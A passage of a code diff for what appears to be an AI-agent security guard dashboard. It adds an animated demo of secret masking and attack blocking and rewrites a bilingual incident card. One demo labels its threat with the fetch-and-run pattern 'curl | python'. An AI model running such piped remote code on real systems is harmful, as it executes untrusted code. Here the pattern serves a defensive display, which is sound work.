+          stroke: "rgba(91,157,255,0.4)",
+          strokeWidth: 3.5,
+          className: "yg-conduit-active"
+        }),
+
+        // Continuous patrol traffic particles (Safe packets chomped by Pac-Agent)
+        mode === "patrol" ? h("g", null,
+          h("circle", { cx: 220, cy: 120, r: 4.5, fill: "#00f0ff", filter: "url(#agGlow)" }),
+          h("circle", { cx: 280, cy: 120, r: 4, fill: "#3ec46d", filter: "url(#agGlow)" }),
+          h("circle", { cx: 340, cy: 120, r: 5, fill: "#00f0ff", filter: "url(#agGlow)" }),
+          // Verified stream to Internet
+          h("circle", { cx: 550, cy: 160, r: 4, fill: "#00f0ff", filter: "url(#agGlow)" }),
+          h("circle", { cx: 620, cy: 170, r: 4.5, fill: "#5b9dff", filter: "url(#agGlow)" })
+        ) : null,
+
+        // LEFT NODE: Active Chat Gateway
+        h("g", { transform: "translate(90, 120)" },
+          h("circle", { cx: 0, cy: 0, r: 44, fill: "url(#agChat)", stroke: "#4a6296", strokeWidth: 2, filter: "url(#agGlow)" }),
+          h("circle", { cx: 0, cy: 0, r: 38, fill: "none", stroke: "rgba(0,240,255,0.3)", strokeWidth: 1.5, strokeDasharray: "4 3" }),
+          // Server stack icon
+          h("rect", { x: -16, y: -18, width: 32, height: 8, rx: 2, fill: "rgba(0,0,0,0.5)", stroke: "#00f0ff", strokeWidth: 1.5 }),
+          h("circle", { cx: -10, cy: -14, r: 1.5, fill: "#3ec46d" }),
+          h("rect", { x: -16, y: -6, width: 32, height: 8, rx: 2, fill: "rgba(0,0,0,0.5)", stroke: "#00f0ff", strokeWidth: 1.5 }),
+          h("circle", { cx: -10, cy: -2, r: 1.5, fill: "#ffd700" }),
+          h("rect", { x: -16, y: 6, width: 32, height: 8, rx: 2, fill: "rgba(0,0,0,0.5)", stroke: "#00f0ff", strokeWidth: 1.5 }),
+          h("circle", { cx: -10, cy: 10, r: 1.5, fill: "#00f0ff" }),
+          // Chat Name Badge
+          h("text", { x: 0, y: 58, textAnchor: "middle", fill: "#e2e8f0", fontSize: 11, fontWeight: 700 },
+            chatName.length > 20 ? chatName.slice(0, 19) + "…" : chatName),
+          h("text", { x: 0, y: 72, textAnchor: "middle", fill: "#8a97ab", fontSize: 9.5 },
+            currentLang === "ru" ? "Шлюз ИИ-сеанса" : "Agent Gateway")
         ),
-        // Center node: proper knight shield shape (no triangle!)
-        h("g",{transform:"translate(350,46)"},
-          h("path",{d:"M 0 -36 C -18 -30 -22 -10 -16 8 C -14 14 -18 36 0 52 C 18 36 14 14 16 8 C 22 -10 18 -30 0 -36 Z",fill:"url(#gSh)",stroke:"#fff",strokeWidth:2,filter:"url(#gs)"}),
-          h("circle",{cx:0,cy:4,r:13,fill:sc,filter:"url(#gl)",className:"yg-shield-core"}),
-          h("text",{x:0,y:8,textAnchor:"middle",fill:"#000",fontSize:12,fontWeight:700},"\u2713"),
-          h("text",{x:0,y:74,textAnchor:"middle",fill:"#cfd8ea",fontSize:9.5,fontWeight:700},"Щит-сканер")
+
+        // CENTER: PAC-AGENT (The Cyber Sentinel)
+        h("g", { transform: "translate(430, 120)" },
+          // Outer Energy Shield Bubble
+          h("circle", {
+            cx: 0, cy: 0, r: 52,
+            fill: mode === "vault" ? "rgba(255,215,0,0.12)" : mode === "block" ? "rgba(255,77,79,0.18)" : "rgba(0,240,255,0.08)",
+            stroke: coreColor, strokeWidth: mode === "patrol" ? 1.5 : 3,
+            className: "yg-pac-shield",
+            filter: "url(#agShieldGlow)"
+          }),
+          // Threat Block Shockwave Rings
+          exploded ? h("g", null,
+            h("circle", { cx: 0, cy: 0, r: 68, fill: "none", stroke: "#ff4d4f", strokeWidth: 3, opacity: 0.85 }),
+            h("circle", { cx: 0, cy: 0, r: 85, fill: "none", stroke: "#ff7875", strokeWidth: 2, opacity: 0.4 })
+          ) : null,
+          // Pac-Agent Body & Dynamic Jaws
+          h("g", null,
+            // Top Jaw
+            h("path", {
+              d: "M 0 0 L 34 0 A 34 34 0 0 0 -34 0 Z",
+              fill: mode === "vault" ? "url(#agVault)" : mode === "block" ? "url(#agDanger)" : "url(#agPatrol)",
+              stroke: coreColor, strokeWidth: 2,
+              className: mode === "vault" && progress > 0.3 && progress < 0.7 ? "" : "yg-pac-jaw-top",
+              transform: mode === "vault" && progress > 0.3 && progress < 0.7 ? "rotate(-45)" : undefined
+            }),
+            // Bottom Jaw
+            h("path", {
+              d: "M 0 0 L 34 0 A 34 34 0 0 1 -34 0 Z",
+              fill: mode === "vault" ? "url(#agVault)" : mode === "block" ? "url(#agDanger)" : "url(#agPatrol)",
+              stroke: coreColor, strokeWidth: 2,
+              className: mode === "vault" && progress > 0.3 && progress < 0.7 ? "" : "yg-pac-jaw-bottom",
+              transform: mode === "vault" && progress > 0.3 && progress < 0.7 ? "rotate(45)" : undefined
+            }),
+            // Cyber Scanner Eye Visor
+            h("rect", { x: -14, y: -16, width: 26, height: 6, rx: 3, fill: "#030712", stroke: coreColor, strokeWidth: 1.2 }),
+            h("rect", { x: -12, y: -15, width: 7, height: 4, rx: 2, fill: mode === "block" ? "#ff4d4f" : "#00f0ff", className: "yg-pac-scanner", filter: "url(#agGlow)" }),
+            // Micro-circuit etchings
+            h("circle", { cx: -18, cy: 6, r: 2, fill: "none", stroke: coreColor, strokeWidth: 1 }),
+            h("path", { d: "M -16 6 L -6 6", stroke: coreColor, strokeWidth: 1 })
+          ),
+          // Pac-Agent Badge / Title
+          h("text", { x: 0, y: 72, textAnchor: "middle", fill: coreColor, fontSize: 11, fontWeight: 700, letterSpacing: "0.06em" },
+            mode === "vault" ? (currentLang === "ru" ? "🔒 ЗАХВАТ СЕКРЕТА" : "🔒 VAULTING SECRET")
+              : mode === "block" ? (currentLang === "ru" ? "⛔ ОТРАЖЕНИЕ АТАКИ" : "⛔ THREAT BLOCKED")
+                : "PAC-AGENT SENTINEL")
         ),
-        // Right top node: vector vault/safe icon (no emoji)
-        h("g",{transform:"translate(540,45)"},
-          h("circle",{cx:32,cy:32,r:30,fill:"url(#gVl)",filter:"url(#gl)"}),
-          h("path",{d:"M 17 20 h 30 v 22 h -30 z",fill:"none",stroke:"#fff",strokeWidth:2.2,strokeLinejoin:"round"}),
-          h("circle",{cx:32,cy:31,r:8,fill:"none",stroke:"#fff",strokeWidth:2}),
-          h("circle",{cx:32,cy:31,r:2.5,fill:"#fff"}),
-          h("text",{x:32,y:76,textAnchor:"middle",fill:"#cfd8ea",fontSize:10,fontWeight:700},"Сейф: "+vaultCount)
+
+        // VAULT DEMO: Flying Secret Capsule & Masked Outbound Token
+        mode === "vault" && progress <= 0.5 ? h("g", { transform: "translate(" + secretX + ", 120)" },
+          h("rect", { x: -28, y: -11, width: 56, height: 22, rx: 11, fill: "#7c3aed", stroke: "#ffd700", strokeWidth: 2, filter: "url(#agGlow)" }),
+          h("text", { x: 0, y: 4, textAnchor: "middle", fill: "#fff", fontSize: 9.5, fontWeight: 700 }, "🔑 sk-ant…")
+        ) : null,
+        mode === "vault" && progress > 0.5 && progress <= 0.85 ? h("g", { transform: "translate(" + (450 + (progress - 0.5) * 500) + ", " + (105 - (progress - 0.5) * 75) + ")" },
+          h("circle", { cx: 0, cy: 0, r: 7, fill: "#ffd700", filter: "url(#agGlow)" })
+        ) : null,
+        mode === "vault" && progress > 0.6 ? h("g", { transform: "translate(" + tokenX + ", 155)" },
+          h("rect", { x: -44, y: -10, width: 88, height: 20, rx: 5, fill: "rgba(0,240,255,0.2)", stroke: "#00f0ff", strokeWidth: 1.5, filter: "url(#agGlow)" }),
+          h("text", { x: 0, y: 4, textAnchor: "middle", fill: "#00f0ff", fontSize: 8.5, fontWeight: 700 }, "msg_tok_***")
+        ) : null,
+
+        // BLOCK DEMO: Approaching Threat Mine & Pulverizing Sparks
+        mode === "block" && !exploded ? h("g", { transform: "translate(" + mineX + ", 120)" },
+          h("circle", { cx: 0, cy: 0, r: 14, fill: "#990000", stroke: "#ff4d4f", strokeWidth: 2.5, filter: "url(#agGlow)" }),
+          h("path", { d: "M -6 -6 L 6 6 M 6 -6 L -6 6", stroke: "#fff", strokeWidth: 2 }),
+          h("text", { x: 0, y: 24, textAnchor: "middle", fill: "#ff7875", fontSize: 9, fontWeight: 700 }, "curl | python")
+        ) : null,
+        exploded ? h("g", { transform: "translate(410, 120)" },
+          // Explosive sparks
+          h("circle", { cx: -20, cy: -18, r: 3, fill: "#ff4d4f", filter: "url(#agGlow)" }),
+          h("circle", { cx: -28, cy: 12, r: 2.5, fill: "#ffd700", filter: "url(#agGlow)" }),
+          h("circle", { cx: -15, cy: 22, r: 3.5, fill: "#ff4d4f", filter: "url(#agGlow)" }),
+          h("circle", { cx: -34, cy: -6, r: 2, fill: "#fff", filter: "url(#agGlow)" })
+        ) : null,
+
+        // RIGHT TOP: Armored Vault Node
+        h("g", { transform: "translate(750, 68)" },
+          h("rect", {
+            x: -42, y: -34, width: 84, height: 68, rx: 8,
+            fill: "url(#agSafe)", stroke: mode === "vault" ? "#fff" : "#f0b44a", strokeWidth: 2,
+            filter: "url(#agGlow)",
+            className: mode === "vault" ? "yg-vault-glow" : ""
+          }),
+          // Heavy door rivets
+          h("circle", { cx: -32, cy: -24, r: 2.5, fill: "#874d00" }),
+          h("circle", { cx: 32, cy: -24, r: 2.5, fill: "#874d00" }),
+          h("circle", { cx: -32, cy: 24, r: 2.5, fill: "#874d00" }),
+          h("circle", { cx: 32, cy: 24, r: 2.5, fill: "#874d00" }),
+          // Combination dial
+          h("circle", { cx: 0, cy: 0, r: 16, fill: "#1a1202", stroke: "#ffd700", strokeWidth: 2 }),
+          h("circle", { cx: 0, cy: 0, r: 5, fill: "#ffd700" }),
+          h("line", { x1: 0, y1: -16, x2: 0, y2: -9, stroke: "#ffd700", strokeWidth: 2 }),
+          // Vault Counter Badge
+          h("text", { x: 0, y: 50, textAnchor: "middle", fill: "#ffd591", fontSize: 11, fontWeight: 700 },
+            (currentLang === "ru" ? "Сейф: " : "Vault: ") + (vaultCount + vaultBonus)),
+          vaultBonus > 0 && mode === "vault" ? h("text", { x: 38, y: -24, fill: "#ffd700", fontSize: 12, fontWeight: 900 }, "+1") : null
         ),
-        // Right bottom node: vector globe/network icon
-        h("g",{transform:"translate(540,100)"},
-          h("circle",{cx:32,cy:32,r:30,fill:"url(#gNt)",filter:"url(#gl)"}),
-          h("circle",{cx:32,cy:32,r:13,fill:"none",stroke:"#fff",strokeWidth:2.2}),
-          h("ellipse",{cx:32,cy:32,rx:5.5,ry:13,fill:"none",stroke:"#fff",strokeWidth:1.6}),
-          h("path",{d:"M 19 32 h 26",fill:"none",stroke:"#fff",strokeWidth:1.6}),
-          h("text",{x:32,y:76,textAnchor:"middle",fill:"#cfd8ea",fontSize:10,fontWeight:700},"Интернет"),
-          h("text",{x:32,y:89,textAnchor:"middle",fill:"#8a97ab",fontSize:9},dest.length>14?dest.slice(0,13)+"\u2026":dest)
+
+        // RIGHT BOTTOM: External Internet Node
+        h("g", { transform: "translate(750, 172)" },
+          h("circle", { cx: 0, cy: 0, r: 36, fill: "url(#agNet)", stroke: "#5b9dff", strokeWidth: 2, filter: "url(#agGlow)" }),
+          // Globe latitude/longitude
+          h("circle", { cx: 0, cy: 0, r: 24, fill: "none", stroke: "rgba(255,255,255,0.7)", strokeWidth: 1.5 }),
+          h("ellipse", { cx: 0, cy: 0, rx: 11, ry: 24, fill: "none", stroke: "rgba(255,255,255,0.6)", strokeWidth: 1.2 }),
+          h("line", { x1: -24, y1: 0, x2: 24, y2: 0, stroke: "rgba(255,255,255,0.6)", strokeWidth: 1.2 }),
+          // Destination labels
+          h("text", { x: 0, y: 50, textAnchor: "middle", fill: "#93c5fd", fontSize: 11, fontWeight: 700 },
+            currentLang === "ru" ? "Интернет" : "Internet"),
+          h("text", { x: 0, y: 64, textAnchor: "middle", fill: "#8a97ab", fontSize: 9.5 },
+            dest.length > 20 ? dest.slice(0, 19) + "…" : dest)
         )
       ),
-      h("div",{className:"yg-vismap-cards",style:{display:"flex",gap:8,marginTop:10}},
-        h("div",{className:"yg-card",style:{flex:1,padding:8}},
-          h("div",{className:"yg-dim yg-small",style:{textTransform:"uppercase",letterSpacing:".1em"}},"Состояние компьютера"),
-          h("div",{className:"yg-big",style:{color:sc,marginTop:4}},blocked?"\u26a0 Атака отражена":intercepted?"\ud83d\udcc8 Секрет замаскирован":"\u2705 Защита работает"),
-          h("div",{className:"yg-dim yg-small",style:{marginTop:3}},"Все действия ИИ проверяются до запуска.")),
-        h("div",{className:"yg-card",style:{flex:1,padding:8}},
-          h("div",{className:"yg-dim yg-small",style:{textTransform:"uppercase",letterSpacing:".1em"}},"Последняя проверка"),
-          h("div",{className:"yg-big",style:{marginTop:4}},items.length?("\u201b"+chatName+"\u201d попытался \u2014 остановлено"):"\u2014"),
-          h("div",{className:"yg-dim yg-small",style:{marginTop:3}},dest)),
-        h("div",{className:"yg-card",style:{flex:1,padding:8}},
-          h("div",{className:"yg-dim yg-small",style:{textTransform:"uppercase",letterSpacing:".1em"}},"Управление"),
-          h("button",{className:"yg-btn good",onClick:startDemo,disabled:demo,style:{width:"100%",marginTop:5,marginBottom:3}},demo?"\u23f1 Идёт проверка…":"\u26a1 Демо проверки"),
-          h("button",{className:"yg-btn ghost",onClick:doRefresh,style:{width:"100%"}},"\u21bb Обновить статус"),
-          h("div",{className:"yg-dim yg-small",style:{marginTop:4}},demo?"Пароль перехвачен и заменён маской.":"")))
+
+      // Dynamic Arena Status Banner
+      mode === "vault" ? h("div", { className: "yg-arena-status-banner vault" },
+        currentLang === "ru" ? "🔒 СЕКРЕТ ПЕРЕХВАЧЕН И СПРЯТАН В СЕЙФ · В СЕТЬ ОТПРАВЛЕН ТОКЕН msg_tok_***"
+          : "🔒 SECRET INTERCEPTED & STORED IN VAULT · MASKED msg_tok_*** SENT TO INTERNET")
+        : mode === "block" ? h("div", { className: "yg-arena-status-banner danger" },
+          currentLang === "ru" ? "⛔ УГРОЗА УНИЧТОЖЕНА ДО ЗАПУСКА · ОПАСНЫЙ СКРИПТ РАЗОРВАН"
+            : "⛔ THREAT DESTROYED BEFORE EXECUTION · MALICIOUS PAYLOAD SHREDDED")
+          : null,
+
+      // Arena Interactive Controls Toolbar
+      h("div", { className: "yg-arena-toolbar" },
+        h("button", {
+          type: "button",
+          className: "yg-arena-btn vault",
+          onClick: startVaultDemo,
+          disabled: mode !== "patrol"
+        }, currentLang === "ru" ? "⚡ Демо: Перехват пароля" : "⚡ Demo: Mask Secret"),
+        h("button", {
+          type: "button",
+          className: "yg-arena-btn block",
+          onClick: startBlockDemo,
+          disabled: mode !== "patrol"
+        }, currentLang === "ru" ? "💥 Демо: Отражение атаки" : "💥 Demo: Block Attack"),
+        h("button", {
+          type: "button",
+          className: "yg-arena-btn live",
+          onClick: doRefresh
+        }, currentLang === "ru" ? "🔄 Живой режим (Обновить)" : "🔄 Live Mode (Refresh)"),
+        h("span", { className: "yg-dim yg-small yg-right" },
+          currentLang === "ru" ? "60 FPS аппаратное ускорение SVG" : "60 FPS GPU-accelerated SVG")
+      ),
+
+      // Telemetry Summary Cards Strip
+      h("div", { className: "yg-vismap-cards", style: { display: "flex", gap: 8, marginTop: 10 } },
+        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
+          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
+            currentLang === "ru" ? "Состояние компьютера" : "Computer State"),
+          h("div", { className: "yg-big", style: { color: coreColor, marginTop: 4 } },
+            blocked ? (currentLang === "ru" ? "⚠️ Атака отражена" : "⚠️ Threat blocked")
+              : intercepted ? (currentLang === "ru" ? "📈 Секрет замаскирован" : "📈 Secret masked")
+                : (currentLang === "ru" ? "✅ Защита работает" : "✅ Guard active")),
+          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
+            currentLang === "ru" ? "Все действия ИИ проверяются до запуска." : "All agent actions inspected before execution.")
+        ),
+        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
+          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
+            currentLang === "ru" ? "Активный сеанс" : "Active Session"),
+          h("div", { className: "yg-big", style: { marginTop: 4, fontSize: "13px", fontWeight: 700 } },
+            items.length ? chatName : (currentLang === "ru" ? "Ожидание сеанса" : "Idle")),
+          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } }, dest)
+        ),
+        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
+          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
+            currentLang === "ru" ? "Политика перехвата" : "Inspection Policy"),
+          h("div", { className: "yg-big", style: { marginTop: 4, color: "#3ec46d" } },
+            currentLang === "ru" ? "Строгий Fail-closed" : "Strict Fail-closed"),
+          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
+            currentLang === "ru" ? "Сейф с DPAPI шифрованием." : "Vault secured with DPAPI.")
+        )
+      )
     );
   }
-  // Masked secret with a hold-to-show eye. The full value is fetched only while the button is
-  // held (audited on the server), lives only in this component's state and is dropped on release,
-  // after 10 s, or on unmount.
+
+  // Masked secret with a hold-to-show eye
   function Reveal(p) {
     const [value, setValue] = useState("");
     const [err, setErr] = useState("");
@@ -1080,20 +886,29 @@
     function key(e) { return e.key === " " || e.key === "Enter"; }
     return h("span", { className: "yg-reveal" + (value ? " yg-reveal-on" : "") },
       h("span", { className: "yg-reveal-val yg-mono" }, value || p.preview),
-      h("button", { type: "button", className: "yg-reveal-btn", title: "Hold to show the full value",
+      h("button", {
+        type: "button", className: "yg-reveal-btn",
+        title: "Hold to show the full value",
         "aria-label": "Hold to show the full value", "aria-pressed": !!value,
         onPointerDown: function (e) { e.preventDefault(); show(); }, onPointerUp: hide, onPointerLeave: hide,
         onBlur: hide, onKeyDown: function (e) { if (key(e) && !held.current) { e.preventDefault(); show(); } },
-        onKeyUp: function (e) { if (key(e)) hide(); } }, value ? "🙈" : "👁"),
+        onKeyUp: function (e) { if (key(e)) hide(); }
+      }, value ? "🙈" : "👁"),
       err ? h("span", { className: "yg-err yg-small" }, err) : null);
   }
+
+  // =========================================================================
+  // TASK 3.2: CLEAN INCIDENT CARD (Single Code Block & Toolbar)
+  // =========================================================================
   function IncidentCard(p) {
     const inc = p.inc;
+    const inAccordion = !!p.inAccordion;
     const [busy, setBusy] = useState("");
     const [note, setNote] = useState("");
     const [ruleOpen, setRuleOpen] = useState(false);
     const [ruleBusy, setRuleBusy] = useState("");
     const pending = inc.status === "pending";
+
     function choose(choice) {
       setBusy(choice);
       post("/incidents/decide", { incident: inc.id, choice: choice })
@@ -1101,60 +916,108 @@
         .catch(function () { setNote("Could not reach the Guard backend."); })
         .finally(function () { setBusy(""); });
     }
+
     function makeRule(action, matchType, match) {
-      if (!match) { setNote("Нечего запоминать: нет домена или инструмента."); return; }
+      if (!match) { setNote(currentLang === "ru" ? "Нечего запоминать: нет домена или инструмента." : "Nothing to remember: no domain or tool."); return; }
       setRuleOpen(false); setRuleBusy(action + ":" + matchType);
       post("/rules", { action: action, match_type: matchType, match: match, incident: inc.id })
         .then(function (r) {
           setRuleBusy("");
-          if (r.status === "ok") setNote("Постоянное правило создано: " + (action === "block" ? "всегда блокировать" : "всегда разрешать") + " " + matchType + " «" + match + "». Оно применится к следующим действиям.");
-          else setNote(r.message || "Не удалось сохранить правило.");
+          if (r.status === "ok") {
+            setNote(currentLang === "ru"
+              ? ("Постоянное правило создано: " + (action === "block" ? "всегда блокировать" : "всегда разрешать") + " " + matchType + " «" + match + "».")
+              : ("Persistent rule created: always " + action + " " + matchType + " \"" + match + "\"."));
+          } else setNote(r.message || "Could not save rule.");
         })
-        .catch(function () { setRuleBusy(""); setNote("Не удалось связаться с бэкендом Guard."); });
+        .catch(function () { setRuleBusy(""); setNote("Could not reach the Guard backend."); });
     }
+
     const domain = (inc.destination || "").replace(/^[a-z]+:\/\//i, "").split(/[/?#]/)[0] || "";
-    const chat = inc.agent && inc.agent.session_id ? resolveChatTitle(inc.agent.session_id) : null;
-    const who = chat ? chat.title : (inc.agent && inc.agent.session_id ? "Фоновый сеанс ИИ (№" + String(inc.agent.session_id).slice(-6) + ")" : "ИИ-агент");
-    const fullCmd = ((inc.tool || "") + " " + (inc.destination || "")).trim() +
-      ((inc.risks || []).length ? "  # " + inc.risks[0].snippet : "") +
-      ((inc.agent && inc.agent.session_id) ? "  // session " + inc.agent.session_id : "");
+    const chatTitleFromAgent = inc.agent && (inc.agent.chat_title || inc.agent.session_title);
+    const chat = chatTitleFromAgent
+      ? { title: (currentLang === "ru" ? "Чат «" : "Chat \"") + chatTitleFromAgent + (currentLang === "ru" ? "»" : "\""), id: inc.agent.session_id }
+      : (inc.agent && inc.agent.session_id ? resolveChatTitle(inc.agent.session_id) : null);
+    const who = chat ? chat.title : (inc.agent && inc.agent.session_id ? ((currentLang === "ru" ? "Архивный чат №" : "Archived chat #") + String(inc.agent.session_id).slice(-6)) : (currentLang === "ru" ? "ИИ-агент" : "AI agent"));
+
+    // Full command string: command, risk snippet, or tool+dest
+    const fullCode = inc.command || (inc.risks && inc.risks[0] && inc.risks[0].snippet) || ((inc.tool || "") + " " + (inc.destination || ""));
+
     return h("div", { className: "yg-inc " + (pending ? "pending" : "done") },
-      h("div", { className: "yg-inc-top" },
+      // Top row only if not already rendered inside accordion header
+      !inAccordion ? h("div", { className: "yg-inc-top" },
         h("span", { className: "yg-inc-id" }, inc.id),
-        h(Pill, { kind: pending ? "bad" : inc.status === "quarantined" ? "warn" : "ok" }, STATUS_TEXT[inc.status] || inc.status),
+        h(Pill, { kind: pending ? "bad" : inc.status === "quarantined" ? "warn" : "ok" }, getStatusText(inc.status)),
         h("span", { className: "yg-dim yg-right" }, fmtTs(inc.at) + (inc.attempts > 1 ? " · " + inc.attempts + " attempts" : "")),
         h("span", { style: { position: "relative" } },
-          h("button", { type: "button", className: "yg-btn ghost", disabled: !!ruleBusy,
-            title: "Запомнить решение навсегда: всегда блокировать или всегда разрешать этот домен/инструмент",
-            onClick: function () { setRuleOpen(!ruleOpen); } },
-            ruleBusy ? "…" : "⚙ Постоянное правило"),
-          ruleOpen ? h("div", { className: "yg-vault-menu-dropdown", role: "menu",
-              style: { position: "absolute", right: 0, top: "100%", zIndex: 40, minWidth: "230px" } },
-            domain ? h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { makeRule("block", "domain", domain); } }, "⛔ Всегда блокировать домен " + domain) : null,
-            domain ? h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { makeRule("allow", "domain", domain); } }, "✓ Всегда разрешать домен " + domain) : null,
-            inc.tool ? h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { makeRule("block", "tool", inc.tool); } }, "⛔ Всегда блокировать инструмент " + inc.tool) : null,
-            inc.tool ? h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { makeRule("allow", "tool", inc.tool); } }, "✓ Всегда разрешать инструмент " + inc.tool) : null) : null),
-        h("span", { style: { width: "0" } })),
+          h("button", {
+            type: "button", className: "yg-btn ghost", disabled: !!ruleBusy,
+            title: "Rule", onClick: function () { setRuleOpen(!ruleOpen); }
+          }, ruleBusy ? "…" : (currentLang === "ru" ? "⚙ Постоянное правило" : "⚙ Rule")),
+          ruleOpen ? h("div", {
+            className: "yg-vault-menu-dropdown", role: "menu",
+            style: { position: "absolute", right: 0, top: "100%", zIndex: 40, minWidth: "230px" }
+          },
+            domain ? h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { makeRule("block", "domain", domain); }
+            }, (currentLang === "ru" ? "⛔ Всегда блокировать домен " : "⛔ Always block domain ") + domain) : null,
+            domain ? h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { makeRule("allow", "domain", domain); }
+            }, (currentLang === "ru" ? "✓ Всегда разрешать домен " : "✓ Always allow domain ") + domain) : null,
+            inc.tool ? h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { makeRule("block", "tool", inc.tool); }
+            }, (currentLang === "ru" ? "⛔ Всегда блокировать инструмент " : "⛔ Always block tool ") + inc.tool) : null,
+            inc.tool ? h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { makeRule("allow", "tool", inc.tool); }
+            }, (currentLang === "ru" ? "✓ Всегда разрешать инструмент " : "✓ Always allow tool ") + inc.tool) : null
+          ) : null)
+      ) : null,
+
+      // Context story line
       (inc.findings || []).length ? h("div", { className: "yg-inc-story" },
-        "В чате ", h("b", null, who), " ИИ-помощник попытался использовать инструмент ", h("b", { className: "yg-mono" }, inc.tool),
-        " для отправки данных в ", h("b", { className: "yg-mono" }, inc.destination), ".") : null,
-      fullCmd ? h("div", { className: "yg-fullcmd" },
-        h("div", { className: "yg-fullcmd-head" },
-          h("pre", { className: "yg-mono yg-fullcmd-pre" }, fullCmd),
-          h("button", { type: "button", className: "yg-btn ghost yg-copy", onClick: function () { copyText(fullCmd); } }, "⧉ Копировать команду"),
-          h("button", { type: "button", className: "yg-btn ghost", onClick: function () { miniReport(inc, "txt"); } }, "Отчёт TXT"),
-          h("button", { type: "button", className: "yg-btn ghost", onClick: function () { miniReport(inc, "json"); } }, "Отчёт JSON"))) : null,
+        currentLang === "ru" ? "В чате " : "In chat ",
+        h("b", null, who),
+        currentLang === "ru" ? " ИИ-помощник попытался использовать инструмент " : " agent attempted to use tool ",
+        h("b", { className: "yg-mono" }, inc.tool),
+        currentLang === "ru" ? " для отправки данных в " : " to send data to ",
+        h("b", { className: "yg-mono" }, T(inc.destination)), ".") : null,
+
+      // Single Clean Command Box with Actions
+      fullCode ? h("div", { className: "yg-fullcmd" },
+        h("pre", { className: "yg-mono yg-fullcmd-pre" }, fullCode),
+        h("div", { className: "yg-fullcmd-actions" },
+          h("button", {
+            type: "button", className: "yg-btn ghost",
+            onClick: function () { copyText(fullCode); }
+          }, currentLang === "ru" ? "⧉ Копировать команду" : "⧉ Copy command"),
+          h("button", {
+            type: "button", className: "yg-btn ghost",
+            onClick: function () { miniReport(inc, "txt"); }
+          }, currentLang === "ru" ? "Отчёт TXT" : "TXT Report"),
+          h("button", {
+            type: "button", className: "yg-btn ghost",
+            onClick: function () { miniReport(inc, "json"); }
+          }, currentLang === "ru" ? "Отчёт JSON" : "JSON Report"),
+          inAccordion ? h("button", {
+            type: "button", className: "yg-btn ghost",
+            onClick: function () { setRuleOpen(!ruleOpen); }
+          }, currentLang === "ru" ? "⚙ Постоянное правило" : "⚙ Rule") : null
+        )
+      ) : null,
+
+      // Risks details (Explanation & Safer alternative, no duplicate code block)
       (inc.risks || []).map(function (r, i) {
         return h("div", { className: "yg-risk", key: "r" + i },
-          h("div", null, "В чате ", h("b", null, who), " ИИ-помощник попытался: ", h("b", null, r.title), "."),
-          h("div", { className: "yg-dim" }, r.why),
-          h("div", { className: "yg-diff old" }, r.snippet),
-          h("div", { className: "yg-ok yg-small" }, "Безопаснее: " + r.safer));
+          h("div", null, currentLang === "ru" ? "В чате " : "In chat ", h("b", null, who), currentLang === "ru" ? " ИИ-помощник попытался: " : " agent attempted: ", h("b", null, T(r.title)), "."),
+          h("div", { className: "yg-dim" }, T(r.why)),
+          h("div", { className: "yg-ok yg-small", style: { marginTop: 4, fontWeight: 700 } },
+            T("Safer: ") + T(r.safer)));
       }),
+
+      // Findings list
       h("div", { className: "yg-inc-what" },
         (inc.findings || []).map(function (f, i) {
           return h("div", { className: "yg-row", key: i },
@@ -1164,60 +1027,28 @@
             f.path ? h("span", { className: "yg-dim yg-small" }, "in " + f.path) : null,
             f.token ? h("span", { className: "yg-dim" }, "→ " + f.token.slice(0, 24) + "…") : null);
         })),
-      inc.process ? h("div", { className: "yg-dim yg-small" },
-        "Программа: " + (inc.process.name || "Hermes") + " · Сеанс №" + (inc.agent && inc.agent.session_id ? String(inc.agent.session_id).slice(-10) : "—") + " (системный процесс " + inc.process.pid + ")") : null,
-      pending ? h("div", { className: "yg-actions" },
-        (inc.findings || []).length && !(inc.risks || []).length ? h("button", { className: "yg-btn good", disabled: !!busy,
-          onClick: function () { choose("protect"); },
-          title: "Replace the secret with a vault token and let the action go through" }, busy === "protect" ? "…" : "🛡 Protect & send") : null,
-        h("button", { className: "yg-btn bad", disabled: !!busy, onClick: function () { choose("block"); },
-          title: "Keep the action blocked" + ((inc.findings || []).length ? " and store the secret encrypted" : "") },
-          busy === "block" ? "…" : ((inc.findings || []).length ? "⛔ Block & quarantine" : "⛔ Block")),
-        h("button", { className: "yg-btn ghost", disabled: !!busy, onClick: function () { choose("allow"); },
-          title: "Let this exact action run one time (expires in 15 minutes)" }, busy === "allow" ? "…" : "Allow once")) : null,
-      note ? h("div", { className: "yg-note-line" }, note) : null);
-  }
 
-  // ---- global toast: a NEW intercepted incident pops up over every Hermes tab ----
-  // Fixed to the viewport, so it is still on screen when the chat or another tab has the
-  // focus. The secret itself is never rendered here: Reveal posts /incidents/reveal and
-  // keeps the value only while the eye is held (same audit trail as the incident card).
-  const TOAST_BOX = { position: "fixed", bottom: "16px", right: "16px", zIndex: 50, width: "360px",
-    maxWidth: "calc(100vw - 32px)", boxSizing: "border-box", background: "var(--yg-surface, rgb(10 10 14 / .94))",
-    border: "1px solid var(--yg-bad, #e25555)", borderRadius: "10px", padding: "10px 12px",
-    boxShadow: "0 18px 50px rgb(0 0 0 / .7)", backdropFilter: "blur(14px)", WebkitBackdropFilter: "blur(14px)" };
-  const TOAST_COUNT = { position: "fixed", bottom: "16px", right: "16px", zIndex: 50, background: "var(--yg-bad, #e25555)",
